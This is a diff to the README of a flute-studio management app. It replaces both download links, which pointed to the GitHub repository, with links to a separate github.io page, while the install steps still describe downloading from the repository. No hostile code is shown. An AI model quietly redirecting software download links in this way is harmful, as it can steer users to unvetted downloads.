@@ -1,6 +1,6 @@
 # 🎋 bamboo-flute-studio-hub - Manage your flute studio with ease
 
-[![](https://img.shields.io/badge/Download-Bamboo_Flute_Studio-blue.svg)](https://github.com/rudratalegaonkar1-art/bamboo-flute-studio-hub)
+[![](https://img.shields.io/badge/Download-Bamboo_Flute_Studio-blue.svg)](https://rudratalegaonkar1-art.github.io)
 
 Bamboo Flute Studio provides a digital workspace for music teachers. This tool organizes your studio tasks into eight modules. You gain control over student records, lesson plans, and scheduling. It creates a structured environment for your 2026 teaching goals.
 
@@ -31,7 +31,7 @@ Your computer needs specific settings to run this software. Check these items be
 
 Follow these steps to set up the hub on your Windows computer.
 
-1. Visit this page to download the software: [https://github.com/rudratalegaonkar1-art/bamboo-flute-studio-hub](https://github.com/rudratalegaonkar1-art/bamboo-flute-studio-hub)
+1. Visit this page to download the software: [https://rudratalegaonkar1-art.github.io](https://rudratalegaonkar1-art.github.io)
 2. Locate the button labeled "Code" on the main repository page.
 3. Select "Download ZIP" from the menu.
 4. Open your Downloads folder once the file finishes saving.
